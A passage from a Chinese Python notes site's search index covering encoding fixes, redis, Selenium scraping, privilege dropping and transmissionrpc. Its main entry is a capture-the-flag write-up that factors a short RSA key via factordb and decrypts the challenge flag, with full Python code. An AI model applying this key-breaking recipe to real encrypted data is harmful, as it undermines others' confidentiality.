64bit\u7248\u672c\uff0c\u95ee\u9898\u89e3\u51b3\u3002\u3002\u3002 \u603b\u7ed3\u4e00\u4e0b\uff0c\u4e07\u4e07\u60f3\u4e0d\u5230Windows\u7248\u672c\u7684\u5de5\u5177(\u9488\u5bf90.5\u7248\u672c)\u4f1a\u628a\u8def\u5f84\u5206\u9694\u7b26 \\\\ \u5f53\u6210\u6587\u4ef6\u540d\u4e00\u90e8\u5206\u6765\u770b\u5f85\uff0c\u771f\u662f\u5927\u5f00\u773c\u754c","title":"3.\u4e0d\u80fd\u4f7f\u7528Windows\u7248\u672c\u7684fcli\u5de5\u5177(fcli.exe)"},{"location":"Python/#linuxgbk","text":"\u4ee3\u7801\u89c1 code/fixgbknames.py \u5728\u7279\u6b8a\u60c5\u51b5\u4e0b\uff0cLinux\u4e2d\u53ef\u80fd\u4f1a\u6709gbk\u7f16\u7801\u7684\u6587\u4ef6\u540d\uff0c\u8fd9\u79cd\u6587\u4ef6\u7528 ls \u67e5\u770b\u90fd\u662f\u4e71\u7801\uff0c\u96be\u4ee5\u64cd\u4f5c \u5982\u4f55\u4fee\u590d\u8fd9\u4e9b \u9519\u8bef \u7684\u6587\u4ef6\u540d\u5462\uff1f\u7528\u5230 python3 \u63d0\u4f9b\u7684os.walk(b\u201d.\u201d)\u5c31\u80fd\u5f97\u5230bytes\u7c7b\u578b\u7684\u6587\u4ef6\u540d\uff0c\u7136\u540e os.system \u8c03\u7528bytes\u7c7b\u578b\u7684 mv \u547d\u4ee4\u884c\u5c31\u597d\u5566~","title":"\u4fee\u590dLinux\u4e0bgbk\u7f16\u7801\u7684\u6587\u4ef6\u540d"},{"location":"Python/#crack-rsa","text":"","title":"Crack RSA!"},{"location":"Python/#_8","text":"\u9898\u76ee\u6765\u6e90\uff1a \u6e05\u534e\u84dd\u83b2\u82b1\u6218\u961f\u7eb3\u65b0\u8868\uff08\u9700\u81ea\u5907\u68af\u5b50\uff09 \u5bc6\u7801\u5b66 (Cryptography) RSA\u7b97\u6cd5\u7684\u539f\u7406\u4ee5\u53ca\u7834\u89e3\uff0c\u8bf7\u4e0b\u8f7d \u8fd9\u4e2a\u6587\u4ef6 \uff0c\u89e3\u5bc6\u5176\u4e2d\u7684flag.enc\u6587\u4ef6\u3002","title":"\u9898\u76ee\u4fe1\u606f"},{"location":"Python/#rsa","text":"\u7565\u2026(\u8fde\u8fd9\u4e2a\u90fd\u4e0d\u77e5\u9053\u8fd8\u4e0d\u53bbgoogle\uff0c\u4f60\u9002\u4e0d\u9002\u5408CTF\u5fc3\u91cc\u4e00\u70b9B\u6570\u90fd\u6ca1\u6709\u5417) \u7b26\u53f7\u7ea6\u5b9a\uff1a n\u4e00\u4e2a\u5927\u6570\uff0c p\u548cq\u662f\u5b83\u7684\u8d28\u56e0\u5b50\uff0cd\u79c1\u94a5\uff0cm\u4fe1\u606f\u660e\u6587\uff0cc\u4fe1\u606f\u5bc6\u6587","title":"RSA\u662f\u5565"},{"location":"Python/#_9","text":"\u53c2\u8003\uff1ahttps://stackoverflow.com/questions/4078902/cracking-short-rsa-keys Google\u641c\u7d22\u5173\u952e\u8bcd crack rsa key \u7ed9\u5b9a\u516c\u94a5n\u548ce\uff0c\u5047\u5b9a\u6211\u4eec\u6210\u529f\u5206\u89e3n = p * q\uff0c\u90a3\u4e48\u6c42\u51fad d = e^-1 mod phi(n) = e^-1 mod (p-1)*(q-1) \u73b0\u5728\u6211\u4eec\u6709\u4e86\u79c1\u94a5d\uff0c\u53ef\u4ee5\u5bf9\u5bc6\u6587c\u89e3\u5bc6\u5f97\u5230\u660e\u6587m\uff1a m = c^d (mod n)","title":"\u7834\u89e3\u7684\u6570\u5b66\u539f\u7406"},{"location":"Python/#_10","text":"","title":"\u5b9e\u73b0\u5b83"},{"location":"Python/#ne","text":"\u9898\u76ee\u7ed9\u7684\u516c\u94a5\u662f\u8fd9\u6837\u7684\uff1a -----BEGIN PUBLIC KEY----- MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMgVHv67DCP6oRAiQJxaEuSluWmE5iZb e+fuqvuwBPUfAgMBAAE= -----END PUBLIC KEY----- \u770b\u8d77\u6765\u5f88\u77ed\uff0c\u4f30\u8ba1\u662f\u53ef\u4ee5\u5206\u89e3\u7684\u6bd4\u8f83\u5c0f\u7684N google\u641c\u7d22\u5173\u952e\u8bcd\uff1aopenssl get n from public key \u53c2\u8003\uff1ahttps://stackoverflow.com/questions/3116907/rsa-get-exponent-and-modulus-given-a-public-key \u4eba\u5bb6\u7ed9\u51fa\u4e86\u8fd9\u6837\u7684\u505a\u6cd5\uff1a(\u73af\u5883Linux\uff0c\u5df2\u7ecf\u5b89\u88c5openssl) # \u4e22\u5f03\u5934\u5c3e\u7684---\u884c\uff0c\u63d0\u53d6\u516c\u94a5\u5185\u5bb9\u5e76\u5408\u5e76\u4e00\u884c\uff08\u8fd9\u662fbase64\u7f16\u7801\u7684\u5b57\u7b26\u4e32\uff09 PUBKEY=`grep -v -- ----- public.pem | tr -d '\\n'` # \u7f16\u7801\u683c\u5f0f\u662fasn1\uff0c\u67e5\u770b\u8fd9\u79cd\u7f16\u7801\u7684\u683c\u5f0f echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i \u5c06\u8f93\u51fa\uff1a 0:d=0 hl=2 l= 60 cons: SEQUENCE 2:d=1 hl=2 l= 13 cons: SEQUENCE 4:d=2 hl=2 l= 9 prim: OBJECT :rsaEncryption 15:d=2 hl=2 l= 0 prim: NULL 17:d=1 hl=2 l= 43 prim: BIT STRING \u6700\u540e\u4e00\u884cBIT STRING\u5c31\u662f\u6570\u636e\u6240\u5728\u7684\u4f4d\u7f6e\uff0c\u504f\u79fb\u4e3a17 \u63d0\u53d6\u51fa\u6765\uff1a echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i -strparse 17 \u5f97\u5230\uff1a 0:d=0 hl=2 l= 40 cons: SEQUENCE 2:d=1 hl=2 l= 33 prim: INTEGER :C8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F 37:d=1 hl=2 l= 3 prim: INTEGER :010001 \u55ef~\u8fd9\u6837\u5c31\u770b\u5230\u5341\u516d\u8fdb\u5236\u7684n\u548ce\u5566\uff0c\u8f6c\u4e3a\u5341\u8fdb\u5236\u7684\u8bddpython\u91cc\u9762\u76f4\u63a5\u8f93\u5165: n = 0xC8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F print(n) \u4e0a\u8ff0python\u6267\u884c\u540e\u5c06\u8f93\u51fa 90499887424928873790510606439768063703452393541528122252967476339871041516831 \u540c\u7406\u6211\u4eec\u5f97\u77e5e=65537\uff0c\u4e00\u822cRSA\u52a0\u5bc6\u90fd\u4f1a\u628a\u516c\u94a5\u7684e\u9009\u4e3a65537","title":"\u9898\u76ee\u7ed9\u7684\u516c\u94a5\u662f\u5565\u683c\u5f0f\uff0c\u600e\u4e48\u8bfb\u53d6\u51faN\u548ce?"},{"location":"Python/#n-pq","text":"\u4f60\u53ef\u4ee5\u81ea\u5df1\u5199\u4ee3\u7801\uff0c\u7136\u800c\u6211\u61d2\uff0c\u76f4\u63a5\u67e5\u6570\u636e\u5e93\uff1a \u6253\u5f00factordb.com\u8fd9\u4e2a\u795e\u5947\u7684\u7f51\u7ad9\uff0c\u8f93\u5165n\u7684\u503c\u5c31\u80fd\u67e5\u5230\u5206\u89e3\u7ed3\u679c\u5566\uff1a http://factordb.com/index.php?query=90499887424928873790510606439768063703452393541528122252967476339871041516831 \u5206\u89e3\u7ed3\u679c\uff1a 9049988742...31<77> = 283194537446483890135816972554288437117<39> \u00b7 319567913424286672035093410391626922443<39> \u597d\u4e86\uff0c\u6211\u4eec\u5c31\u77e5\u9053 p q\u4e86\uff0c\u5177\u4f53\u54ea\u4e2a\u662fp\u54ea\u4e2a\u662fq\u5e76\u4e0d\u91cd\u8981 p=283194537446483890135816972554288437117, q=319567913424286672035093410391626922443","title":"\u600e\u4e48\u5206\u89e3n \u5f97\u5230p\u548cq\uff1f"},{"location":"Python/#d","text":"\u6839\u636eRSA\u539f\u7406\uff0c d = e^-1 mod (p-1)*(q-1)\uff0c \u73b0\u5728\u6211\u4eec\u6709\u4e86p\u548cq\uff0cmod\u540e\u9762\u7684(p-1)*(q-1)\u81ea\u7136\u662f\u53ef\u4ee5\u6c42\u51fa\u6765\u7684 \u4f46e^-1\u662f\u4e2a\u5565\u73a9\u610f\uff1f\u5012\u6570\uff1f \u5012\u6570\u8fd8\u80fd\u6c42\u6a21\uff1f emmm \u5176\u5b9e\u662f\u6c42\u9006\u5143\u5566 \u7136\u800c\u4e0d\u4f1a\u5199\u4ee3\u7801\u600e\u4e48\u529e\uff0c\u5f53\u65f6\u662f\u7ee7\u7eedgoogle\u554a google\u5173\u952e\u8bcd\uff1a python calculate inverse mod \u53c2\u8003\uff1ahttps://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python \u5f97\u5230\u4ee3\u7801\uff1a def egcd ( a , b ): if a == 0 : return ( b , 0 , 1 ) else : g , y , x = egcd ( b % a , a ) return ( g , x - ( b // a ) * y , y ) def modinv ( a , m ): g , x , y = egcd ( a , m ) if g != 1 : raise Exception ( 'modular inverse does not exist' ) else : return x % m \u770b\u4e0d\u61c2\u8fd9\u4ee3\u7801\u5728\u5e72\u5565\uff1f\u6211\u4e5f\u770b\u4e0d\u61c2\uff0c\u4f46\u6ca1\u5173\u7cfb\uff0c\u76f4\u63a5\u7528\u5c31\u884c \u8fd9\u4e48\u591a\u4eba\u70b9\u8d5e\u80af\u5b9a\u662f\u5bf9\u7684 \u90a3\u73b0\u5728\u5c31\u7740\u624b\u628a\u8fd9\u4ee3\u7801\u642c\u8fd0\u5230\u6211\u4eec\u7684py\u4e2d\u54af\uff1a N = 0 xC8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F e = 0 x10001 p = 283194537446483890135816972554288437117 q = 319567913424286672035093410391626922443 def egcd ( a , b ): if a == 0 : return ( b , 0 , 1 ) else : g , y , x = egcd ( b % a , a ) return ( g , x - ( b // a ) * y , y ) def modinv ( a , m ): g , x , y = egcd ( a , m ) if g != 1 : raise Exception ( 'modular inverse does not exist' ) else : return x % m d = modinv ( e , ( p - 1 ) * ( q - 1 )) print ( d ) \u4e0a\u8ff0python\u5c06\u8f93\u51fa34458919248694250828820386546500026880096887166581679876896066449320377773297\uff0c \u771f\u662f\u4e00\u4e2a\u597d\u5927\u7684d\u554a\u3002\u3002\u3002","title":"\u600e\u4e48\u8ba1\u7b97\u79c1\u94a5d"},{"location":"Python/#flagencint","text":"\u8bd5\u56fe\u7528\u8bb0\u4e8b\u672c\u6253\u5f00flag.enc\uff0c\u4e71\u7801\u4e86\uff1b\u90a3\u7528\u4e8c\u8fdb\u5236\u5f62\u5f0f\u6253\u5f00flag.inc\u6587\u4ef6\u770b\u770b\uff1a emmm\u4e00\u517132\u5b57\u8282\u957f\u7684\u5bc6\u6587\uff0c\u76f4\u63a5\u8bfb\u6587\u4ef6\u5c06\u5f97\u5230bytes strig\uff0c\u600e\u4e48\u628a\u5b83\u8f6c\u4e3a\u4e00\u4e2a\u5f88\u5927\u7684\u6574\u6570\u5462\uff1f google\u5173\u952e\u8bcd\uff1a python byte string to int \u53c2\u8003\uff1ahttps://stackoverflow.com/questions/444591/convert-a-string-of-bytes-into-an-int-python \u4eba\u5bb6\u7ed9\u51fa\u4e86python3.2\u4ee5\u540e\u53ef\u4ee5\u7528int.from_bytes\u7684\u65b9\u5f0f\uff0c\u7ee7\u7eed\u5199\u6211\u4eec\u7684py\u54af\uff1a encrypteddata = open('flag.enc','rb').read() c = int.from_bytes(encrypteddata, 'big') print(c) \u8fd9\u91cc\u7684\u2019big\u2019\u8868\u793a\u5927\u7aef\u5b58\u653e\u7684\u65b9\u5f0f\uff0c\u5c31\u662f\u6700\u91cd\u8981\u7684\u90a3\u4e00\u4f4d\u662f\u9760\u5de6\u8fb9\u7684 \u63d2\u4e00\u53e5\uff1a\u901a\u8fc7\u8be2\u95ee\u5176\u4ed6\u5927\u4f6c\uff0c\u6211\u4e5f\u6298\u817e\u51fa\u4e86\u4e00\u79cdnaive\u7684\u65b9\u6cd5\u2014\u2014\u4f7f\u7528binascii\u6a21\u5757\u5148\u8f6c\u4e3ahex\u7f16\u7801\uff0c\u7136\u540ehex\u630916\u5b57\u8282\u8f6cint: encrypteddata = open ( 'flag.enc' , 'rb' ) . read () import binascii c = int ( binascii . b2a_hex ( encrypteddata ) . decode (), 16 ) print ( c )","title":"\u600e\u4e48\u628aflag.enc\u5f53\u6210\u4e00\u4e2aint\u8bfb\u5165\uff1f"},{"location":"Python/#_11","text":"\u516c\u5f0f\uff08\u5bc6\u7801\u5b66\u80af\u5b9a\u8981\u8003\u7684\uff0c\u6240\u4ee5\u518d\u8bb0\u4e00\u6b21\u54af\uff09 m = c^d (mod n) \u95ee\u9898\u6765\u4e86\uff0cd\u662f\u4e2a\u90a3\u4e48\u5927\u7684\u6570\uff0c\u5982\u679c\u76f4\u63a5\u5199\u4e00\u4e2a\uff1a # \u5728python\u91cc**\u8868\u793a\u4e58\u65b9 m = (c**d)%n \u679c\u7136\u8fd0\u884c\u8fd9\u4e2apy\u5c31\u5361\u6b7b\u4e86\uff0c\u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\u5fc5\u8981\u7b97\u51fa\u7cbe\u786e\u7684c**d\uff0c\u6211\u4eec\u9700\u8981\u8c03\u7528\u5feb\u901f\u7684mod\u4e58\u65b9\u7684\u65b9\u6cd5 google\u5173\u952e\u8bcd\uff1a python mod pow \u53c2\u8003\uff1ahttps://stackoverflow.com/questions/32738637/calculate-mod-using-pow-function-python \u4eba\u5bb6\u8bf4pow\u51fd\u6570\u5c31\u53ef\u4ee5\u63d0\u4f9b\u7b2c3\u4e2a\u53c2\u6570\uff0c\u4f8b\u5982pow(6, 8, 5)\u5c31\u662f 6^8 mod 5 \u90a3\u5c31\u5199\u4ee3\u7801\u54af(\u778e\u5199\uff0cC\u8bed\u8a00\u7684pow\u9700\u8981#include \u90a3\u6211\u5c31\u4e5f\u4ecemath\u5bfc\u5165\u5427)\uff1a from math import pow m = pow ( c , d , n ) \u7136\u800c\u547d\u9014\u591a\u821b\uff0c\u679c\u7136\u62a5\u9519\uff1a Traceback (most recent call last): File \"run.py\", line 35, in <module> m = pow(c,d,n) TypeError: pow expected 2 arguments, got 3 emmm\u2026 \u5947\u4e86\u602a\u4e86\uff0c\u8fd9\u662f\u4ec0\u4e48\u9b3c\u561b\uff0c\u8bf4\u597d\u7684\u652f\u6301\u7b2c\u4e09\u4e2a\u53c2\u6570\u5462\uff0c\u7ffb\u56de\u53bb\u4ed4\u7ec6\u770b\u4eba\u5bb6\u7ed9\u7684 \u6587\u6863\u94fe\u63a5 \u55ef\uff1f\u8fd9\u6587\u6863\u7684\u6807\u9898\u5c31\u662fBuilt-in Functions\uff0c\u6211\u61c2\u4e86\uff01 \u652f\u6301\u7b2c\u4e09\u4e2a\u53c2\u6570\u7684pow\u51fd\u6570\u662f\u5185\u7f6e\u7684\u90a3\u4e2a\uff0c\u800c\u4e0d\u662fmath\u5e93\u63d0\u4f9b\u7684\uff0c\u5220\u6389 from math import pow \u8fd9\u4e00\u53e5\u5c31\u597d\u4e86 \u6211\u4eec\u7684py\u53c8\u52a0\u4e0a\u4e86\u4e24\u884c\uff1a m = pow(c,d,n) print(m) \u5f97\u5230\u8f93\u51fa 4114174865819530012247735243997890458185276719507135882385278623252053258","title":"\u8ba1\u7b97\u660e\u6587"},{"location":"Python/#flag","text":"cy\u6253\u5f00\u4e86\u4ed6\u7684\u7b14\u8bb0\u672c https://py3.io/Python.html#bytes \u67e5\u5230\u4e86 \u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6cbytes\u5b57\u7b26\u4e32 \u548c \u62ff\u5230\u4e00\u4e2aint\u8f6c\u5b57\u7b26\u4e32 \u7684\u65b9\u6cd5\uff1a from base64 import b16decode print ( b16decode ( hex ( m )[ 2 :] . upper () ) ) \u679c\u7136 \u53c8tm\u51fa\u9519\u4e86\uff1a Traceback (most recent call last): File \"run.py\", line 37, in <module> print( b16decode( hex(m)[2:].upper() ) ) File \"/usr/lib/python3.5/base64.py\", line 276, in b16decode return binascii.unhexlify(s) binascii.Error: Odd-length string odd-length\u5565\u610f\u601d\uff1f\u5947\u6570\u957f\u5ea6\uff1f\u5bf9\u5662 \u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u80af\u5b9a\u8981\u5076\u6570\u957f\u5ea6\u624d\u884c\uff08\u4e24\u4e2a\u4e00\u7ec4\u8868\u793a\u4e00\u4e2a\u5b57\u8282\u561b\uff09 \u90a3\u4e48\u5c31\u524d\u9762\u8865\u4e2a0\u54af py\u4ee3\u7801\u5982\u4e0b\uff1a\uff08\u5176\u5b9e\u4f60\u4e5f\u53ef\u4ee5\u8bd5\u8bd5int.to_bytes\u65b9\u6cd5\uff09 plaindata = hex(m)[2:].upper() if len(plaindata)%2 : plaindata = \"0\"+plaindata print(b16decode(plaindata)) \u8f93\u51fa\uff1a b'\\x02T\\x1b:(\\x02\\xb9\\x8c8\\xbb\\x00CTF{256i3_n0t_SAfe}\\n' \u554a\u54c8\uff01 \u603b\u7b97\u80fd\u641e\u5b9a\u5566\uff0cflag\u5230\u624b\uff01","title":"\u660e\u6587\u8fd9\u4e48\u4e00\u4e2a\u5927\u6570 \u6211\u8981\u7684flag\u5462\uff1f"},{"location":"Python/#_12","text":"# parse public key: https://stackoverflow.com/questions/3116907/rsa-get-exponent-and-modulus-given-a-public-key # PUBKEY=`grep -v -- ----- public.pem | tr -d '\\n'` # echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i # echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i -strparse 17 n = 0xC8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F e = 0x10001 print ( n ) # visit http://factordb.com/index.php?query=90499887424928873790510606439768063703452393541528122252967476339871041516831 p = 283194537446483890135816972554288437117 q = 319567913424286672035093410391626922443 def egcd ( a , b ): if a == 0 : return ( b , 0 , 1 ) else : g , y , x = egcd ( b % a , a ) return ( g , x - ( b // a ) * y , y ) def modinv ( a , m ): g , x , y = egcd ( a , m ) if g != 1 : raise Exception ( 'modular inverse does not exist' ) else : return x % m d = modinv ( e , ( p - 1 ) * ( q - 1 )) print ( d ) encrypteddata = open ( 'flag.enc' , 'rb' ) . read () import binascii c = int ( binascii . b2a_hex ( encrypteddata ) . decode (), 16 ) print ( c ) c = int . from_bytes ( encrypteddata , 'big' ) print ( c ) m = pow ( c , d , n ) print ( m ) from base64 import b16decode plaindata = hex ( m )[ 2 :] . upper () if len ( plaindata ) % 2 : plaindata = \"0\" + plaindata print ( b16decode ( plaindata ))","title":"\u5b8c\u6574\u7684\u4ee3\u7801"},{"location":"Python/#_13","text":"import time \u5f97\u5230\u5f53\u524d\u65f6\u95f4\u6233\uff1a int(time.time()) \u5f97\u5230\u5f53\u524d\u65f6\u95f4\u5b57\u7b26\u4e32\uff1atime.strftime(\u201c%Y-%m-%d %H:%M:%S\u201d) \u65f6\u95f4\u62331381419600\u8f6c\u5b57\u7b26\u4e32\uff1atime.strftime(\u201c%Y-%m-%d %H:%M:%S\u201d, time.localtime(1381419600)) \u5b57\u7b26\u4e32\u201d2013-10-10 23:40:00\u201d\u8f6c\u65f6\u95f4\u6233\uff1aint(time.mktime(time.strptime(\u201c2013-10-10 23:40:00\u201d,\u201d%Y-%m-%d %H:%M:%S\u201d)))","title":"\u65f6\u95f4\u6233\u4e0e\u5b57\u7b26\u4e32\u76f8\u4e92\u8f6c\u6362"},{"location":"Python/#redis","text":"\u5047\u8bbe\u5b58\u50a8\u4e00\u4e2a\u7528\u6237\u540d\u5bf9\u5e94\u7528\u6237ID\u7684\u5b57\u5178\uff0c\u540d\u79f0\u4e3aUSERS\uff0c\u4f8b\u5982{\u201czhangsan\u201d:1, \u201clisi\u201d:2} import redis r = redis . StrictRedis ( host = 'localhost' , port = 6379 , db = 1 ) #db\u53c2\u6570\u53ef\u4ee5\u7406\u89e3\u4e3a\u547d\u540d\u7a7a\u95f4 assert r . ping () # \u662f\u5426\u6210\u529f\u8fde\u4e0a USERS = { \"zhangsan\" : 1 , \"lisi\" : 2 } # \u5b58\u50a8\u5b57\u5178 r . hmset ( \"USERS\" , USERS ) # \u83b7\u5f97\u5df2\u7ecf\u5b58\u50a8\u7684\u5b57\u5178\u91cc\u9762\u6709\u54ea\u4e9b\u952e\uff0c\u8fd4\u56debytes\u7684list KEYS = r . hkeys ( \"USERS\" ) # \u83b7\u5f97\u6574\u4e2a\u5b57\u5178\u5e76\u8f6c\u6362\u56de\u539f\u6765\u7684\u7c7b\u578b USERS1 = { i . decode (): int ( j ) for i , j in r . hgetall ( \"USERS\" ) . items ()} # \u4fee\u6539\u5b57\u5178\u4e2d\u4e00\u4e2akey\u7684value r . hset ( \"USERS\" , \"zhangsan\" , 3 ) # \u5220\u9664\u5b58\u50a8\u7684\u5b57\u5178\uff0c\u53ea\u80fd\u4e00\u4e2a\u4e2a\u5220\uff0c\u5148\u8981hkeys\u83b7\u53d6\u6709\u54ea\u4e9b\u952e _ = [ r . hdel ( \"USERS\" , key ) for key in r . hkeys ( \"USERS\" ) ] # \u626b\u63cf\u5f0f\u83b7\u5f97\u5df2\u7ecf\u5b58\u50a8\u7684\u5b57\u5178\u91cc\u9762\u6709\u54ea\u4e9b\u952e ## \u5982\u679c\u5b57\u5178\u91cc\u9762\u5b58\u50a8\u4e86\u592a\u591a\u4e1c\u897f\uff0c\u6267\u884cKEYS\u4f1a\u5361\u4f4f\u6574\u4e2aredis\uff0c\u7528hscan\u662f\u66f4\u597d\u7684\u9009\u62e9 ## \u8fd9\u91cc\u5148\u751f\u6210\u4e00\u4e2a\u6bd4\u8f83\u5927\u7684\u5b57\u5178\u5b58\u8fdb\u53bb import random , string randomstr = lambda n : \"\" . join ( random . sample ( string . ascii_letters , n )) USERS = { randomstr ( 10 ): random . randint ( 1 , 10000 ) for _ in range ( 10000 )} # \u751f\u6210\u4e00\u4e2a1w\u6761\u8bb0\u5f55\u7684\u5b57\u5178 r . hmset ( \"USERS\" , USERS ) # \u5b58\u8fdb\u53bb ## \u5faa\u73afhscan cursor , result = r . hscan ( \"USERS\" ) while cursor : cursor , tmp = r . hscan ( \"USERS\" , cursor ) result . update ( tmp ) USERS2 = { i . decode (): int ( j ) for i , j in result . items ()} #\u4ecebytes\u8f6c\u4e3a\u539f\u6765\u7684\u683c\u5f0f assert USERS == USERS2 #\u5b58\u8fdb\u53bb\u7684\u4e0e\u53d6\u51fa\u6765\u7684\u5e94\u8be5\u76f8\u540c","title":"\u7528redis\u5b58\u50a8\u5b57\u5178"},{"location":"Python/#nexushd","text":"\u4ee3\u7801\uff1a code/autoseed_byr2nhd.py \u4f9d\u8d56\u4e8e EasyLogin \uff0c\u4ee5\u53ca pip3 install transmissionrpc python-resize-image \u8fd0\u884c\u9700\u8981\u63d0\u4f9bbyr\u548cNHD\u7684\u767b\u5f55cookie\uff0c\u4ee5\u53catransmission\u8fde\u63a5\u4fe1\u606f","title":"\u642c\u8fd0\u79cd\u5b50 \u4ece\u5317\u90ae\u4eba\u642c\u8fd0\u5230NexusHD"},{"location":"Python/#python-seleniumdocker-chrome-headless","text":"\u4f8b\u5b50\uff1a\u963f\u91cc\u4e91\u6240\u6709\u57df\u540d\u4ef7\u683c\u9875\u9762 https://wanwang.aliyun.com/help/price.html \u4ece\u7f51\u7edc\u8bf7\u6c42\u770b\u51fa\u5176\u4ef7\u683c\u63a5\u53e3\u6709\u591a\u4e2a\uff0c\u800c\u4e14\u8f83\u4e3a\u590d\u6742\uff1b\u90a3\u5c31\u4e0d\u59a8\u8bd5\u8bd5\u7528selenium\u8ba9chrome headless\u8bbf\u95ee\u8fd9\u4e2a\u9875\u9762\uff0c\u52a0\u8f7d\u6e32\u67d3\u5b8c\u6210\u540e\u6211\u4eec\u518d\u83b7\u53d6\u9875\u9762\u6e90\u4ee3\u7801\uff0c\u6b64\u65f6\u6e90\u4ee3\u7801\u91cc\u9762\u5c31\u6709\u4e86\u5b8c\u6574\u7684\u4ef7\u683c\u6570\u636e \u8fd0\u884c\u73af\u5883\uff1a\u53ea\u9700\u8981Docker\u548cPython3\uff0c\u65e0\u9700\u684c\u9762\u73af\u5883 \u955c\u50cf\u53c2\u8003\uff1ahttps://hub.docker.com/r/selenium/standalone-chrome/ \u5148\u8dd1\u8d77\u6765\u5bb9\u5668\u5457\uff0c\u8fd9\u6837\u5c31\u8fd0\u884c\u4e86selenium server\uff0c\u4e3b\u673a\u66b4\u9732\u4e86\u4e00\u4e2a6666\u7aef\u53e3\uff0c\uff1a docker run -d -p 6666:4444 -v /dev/shm:/dev/shm selenium/standalone-chrome \u5b89\u88c5Python\u5305\uff1a pip3 install selenium \u8c03\u7528\u4ee3\u7801\uff0c\u722c\u53d6url\uff0c\u5f97\u5230\u7f51\u9875\u6e90\u4ee3\u7801\uff0c\u5176\u4e2d127.0.0.1\u76f8\u5e94\u5730\u4fee\u6539\u4e3aDocker\u4e3b\u673a\u7684IP: url = \"https://wanwang.aliyun.com/help/price.html\" from selenium import webdriver from selenium.webdriver.common.desired_capabilities import DesiredCapabilities driver = webdriver . Remote ( command_executor = 'http://127.0.0.1:6666/wd/hub' , desired_capabilities = DesiredCapabilities . CHROME ) driver . get ( url ) html = driver . page_source with open ( \"result.html\" , \"w\" , encoding = \"utf-8\" ) as fp : fp . write ( html ) driver . quit () #\u4e00\u5b9a\u8981\u8bb0\u5f97\u6e05\u7406\u6389Chrome\u8fdb\u7a0b \u5426\u5219\u5185\u5b58\u4f1a\u5360\u6ee1 \u5982\u679c\u6ca1\u6709\u5728\u4ee3\u7801\u91cc\u9762\u6e05\u7406Chrome\u8fdb\u7a0b\uff0c\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u91cc\u9762\u8fdb\u5165Console\uff0c\u5728\u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u5f53\u524d\u8fd0\u884c\u7684Session (Chrome\u8fdb\u7a0b) \uff0c\u5bf9\u5f53\u524d\u9875\u9762\u67e5\u770b\u9875\u9762\u622a\u56fe\uff1a http://127.0.0.1:6666/wd/hub/static/resource/hub.html","title":"python selenium+Docker chrome headless\u722c\u590d\u6742\u7f51\u9875"},{"location":"Python/#pythonroot","text":"\u5982\u679cpython\u9700\u8981\u76d1\u542c80\u7aef\u53e3\uff0c\u7b80\u5355\u65b9\u5f0f\u5c31\u662f\u76f4\u63a5\u7528root\u6743\u9650\u542f\u52a8\uff0c\u4f46\u542f\u52a8\u540e\u53ef\u4ee5\u4e22\u5f03root\u6743\u9650\u6765\u63d0\u9ad8\u5b89\u5168\u6027 code from https://stackoverflow.com/questions/2699907/dropping-root-permissions-in-python import os , pwd , grp def drop_privileges ( uid_name = 'nobody' , gid_name = 'nogroup' ): if os . getuid () != 0 : # We're not root so, like, whatever dude return # Get the uid/gid from the name running_uid = pwd . getpwnam ( uid_name ) . pw_uid running_gid = grp . getgrnam ( gid_name ) . gr_gid # Remove group privileges os . setgroups ([]) # Try setting the new uid/gid os . setgid ( running_gid ) os . setuid ( running_uid )","title":"python\u4e22\u5f03root\u6743\u9650"},{"location":"Python/#python-transmissionrpc","text":"\u4e0b\u8ff0\u4e3b\u8981\u4ecb\u7ecd transmissionrpc \u8fd9\u4e2a\u5e93\u7684\u4f7f\u7528","title":"python transmissionrpc"},{"location":"Python/#_14","text":"\u4f7f\u7528Client\u7684add_torrent\u65b9\u6cd5\uff0c\u4f20\u5165\u79cd\u5b50\u6587\u4ef6\u7684base64 def upload_transmission ( thost , tport , tuser , tpassword , filename ): tc = transmissionrpc . Client ( thost , port = tport , user = tuser , password = tpassword ) return tc . add_torrent ( base64 . b64encode ( open ( filename , \"rb\" ) . read ()) . decode ()) \u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u4e0d\u5b8c\u6574\u7684torrent\u5bf9\u8c61","title":"\u4e0a\u4f20\u4e00\u4e2a\u79cd\u5b50 \u5f00\u59cb\u4e0b\u8f7d"},{"location":"Python/#torrent","text":"torrent_id = torrent.id full_torrent = tc.get_torrent(torrent_id) \u5176\u4e2d\u5c31\u6709\u72b6\u6001\u548c\u8fdb\u5ea6\u4fe1\u606f print(full_torrent.status, full_torrent.progress)","title":"\u83b7\u53d6\u5b8c\u6574\u7684torrent\u5bf9\u8c61"},{"location":"Python/#tracker","text":"\u8fd9\u6837\u53ef\u4ee5\u628apt\u7ad9\u70b9\u7684\u79cd\u5b50\u8f6c\u5230OpenTracker\uff0c\u65e0\u9700\u91cd\u65b0\u6821\u9a8c\u79cd\u5b50\uff08\u4f46\u4f20\u5230\u65b0\u7684pt\u7ad9\u70b9infohash\u4f1a\u53d8\uff0c\u53ea\u80fd\u4f20\u65b0\u79cd\u5b50\u91cd\u65b0\u6821\u9a8c\uff09 transmissionrpc\u672c\u8eab\u4f3c\u4e4e\u6ca1\u6709\u66b4\u9732\u51fatrackerAdd\u7684\u65b9\u6cd5\uff0c\u8fd9\u662f\u7ed3\u5408\u6d4f\u89c8\u5668\u548c\u7ffb\u9605\u4ee3\u7801\u81ea\u5df1\u8bd5\u51fa\u6765\u7684 torrent . _client . _request ( 'torrent-set' , { \"trackerAdd\" : [ new_tracker_url ] } , torrent . id , True 